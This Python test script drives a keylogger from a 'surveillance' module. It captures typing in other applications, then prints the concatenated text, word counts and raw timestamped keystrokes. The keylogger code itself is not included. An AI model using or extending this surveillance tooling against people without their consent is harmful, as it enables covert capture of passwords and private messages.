#!/usr/bin/env python3
"""
Test script to demonstrate enhanced keylogger with text concatenation
"""
import sys
import os
import time

# Add the modules path
MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), 'modules'))
if MODULES_PATH not in sys.path:
    sys.path.append(MODULES_PATH)

from modules.surveillance import start_keylogger, stop_keylogger, is_keylogger_running, get_current_keylogger_text

def test_enhanced_keylogger():
    """Test the enhanced keylogger with text concatenation"""
    
    print("=== Enhanced Keylogger Test with Text Concatenation ===")
    
    # Start keylogger
    print("\n1. Starting keylogger...")
    start_result = start_keylogger()
    print(f"   Start result: {start_result}")
    
    if start_result.get('status') != 'success':
        print("   ❌ Failed to start keylogger")
        return
    
    # Wait for user to type
    print("\n2. Keylogger is now running!")
    print("   Please type some text in any application (like Notepad)")
    print("   Type multiple words with spaces, punctuation, etc.")
    print("   Type for about 15 seconds, then come back here...")
    
    # Countdown
    for i in range(15, 0, -1):
        print(f"   Time remaining: {i} seconds...", end='\r')
        time.sleep(1)
    print("\n   Time's up! Let's check current text...")
    
    # Get current text without stopping
    print("\n3. Getting current text without stopping...")
    current_text_result = get_current_keylogger_text()
    print(f"   Current text result: {current_text_result}")
    
    if current_text_result.get('status') == 'success':
        current_text = current_text_result.get('processed_text', '')
        word_count = current_text_result.get('word_count', 0)
        char_count = current_text_result.get('character_count', 0)
        
        print(f"\n   📝 Current Text: '{current_text}'")
        print(f"   📊 Word Count: {word_count}")
        print(f"   🔢 Character Count: {char_count}")
    
    # Wait a bit more and type more
    print("\n4. Type a bit more text (5 seconds)...")
    for i in range(5, 0, -1):
        print(f"   Time remaining: {i} seconds...", end='\r')
        time.sleep(1)
    print("\n   Getting updated text...")
    
    # Get updated text
    updated_text_result = get_current_keylogger_text()
    if updated_text_result.get('status') == 'success':
        updated_text = updated_text_result.get('processed_text', '')
        print(f"   📝 Updated Text: '{updated_text}'")
    
    # Now stop the keylogger
    print("\n5. Stopping keylogger...")
    stop_result = stop_keylogger()
    print(f"   Stop result: {stop_result}")
    
    # Check final result
    if stop_result.get('status') == 'success':
        final_text = stop_result.get('processed_text', '')
        word_count = stop_result.get('word_count', 0)
        char_count = stop_result.get('character_count', 0)
        raw_data = stop_result.get('data', [])
        
        print(f"\n6. ✅ Final Results:")
        print(f"   📝 Final Text: '{final_text}'")
        print(f"   📊 Total Words: {word_count}")
        print(f"   🔢 Total Characters: {char_count}")
        print(f"   📋 Raw Keystrokes: {len(raw_data)} keystrokes")
        
        # Show some raw keystrokes
        if raw_data:
            print("\n   🔍 Sample Raw Keystrokes:")
            for i, key_data in enumerate(raw_data[:10]):
                print(f"      {i+1}. '{key_data.get('key', 'Unknown')}' at {key_data.get('timestamp', 'Unknown')}")
            if len(raw_data) > 10:
                print(f"      ... and {len(raw_data) - 10} more")
    
    print("\n=== Enhanced Keylogger Test Complete ===")

if __name__ == "__main__":
    test_enhanced_keylogger()
